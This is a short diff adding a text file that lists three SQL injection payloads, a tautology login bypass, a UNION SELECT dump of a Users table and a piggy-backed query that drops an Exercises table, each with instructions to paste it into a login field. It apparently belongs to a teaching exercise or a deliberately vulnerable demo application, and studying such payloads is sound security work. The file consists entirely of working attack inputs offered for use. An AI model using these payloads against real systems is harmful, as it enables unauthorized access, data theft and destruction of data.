@@ -1,0 +1,12 @@
+
+Tautology
+copy the line below and paste in the login field.(there's a white space at the end)
+' or 1=1-- 
+
+union query
+copy the line below and paste in the login field.(there's a white space at the end)
+' UNION SELECT * FROM Users -- 
+
+-Piggy Backed Queries
+copy the line below and paste in the login field.(there's a white space at the end)
+' ; drop table Exercises-- 
